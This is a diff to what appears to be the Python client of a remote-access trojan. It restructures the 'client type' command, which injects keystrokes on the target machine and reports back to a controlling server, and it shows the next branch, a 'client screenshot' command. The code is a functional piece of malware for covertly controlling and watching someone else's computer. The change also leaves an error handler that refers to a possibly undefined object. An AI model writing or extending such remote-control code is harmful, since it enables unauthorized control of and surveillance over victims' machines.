@@ -396,16 +396,18 @@ if __name__ == "__main__":
         elif command.startswith("client type"):
             keyboard = None
 
-            try:
-                # Split out the text and join it back together as a string, then type it
-                text = " ".join(command.split()[2:])
-                keyboard = Controller()
-                keyboard.type(text)
-                post_to_server(f"\n[+]-Client => Your message: \n{text} => was typed on the client\n")
-            except IndexError:
-                post_to_server("You must enter some text to type on the client. \n")
-            except keyboard.InvalidCharacterException:
-                post_to_server("A not-typeable Characters was Encountered. \n")
+            # Split out the text and join it back together as a string, then type it
+            text = " ".join(command.split()[2:])
+
+            if not text:
+                post_to_server("[-]-Client => You must enter some text to type on the client. \n")
+            else:
+                try:
+                    keyboard = Controller()
+                    keyboard.type(text)
+                    post_to_server(f"\n[+]-Client => Your message: \n{text} => was typed on the client\n")
+                except keyboard.InvalidCharacterException:
+                    post_to_server("[-]-Client => A not-typeable Characters was Encountered. \n")
 
         # the 'client screenshot' command allows us to grab a copy from the client's screen
         elif command == "client screenshot":
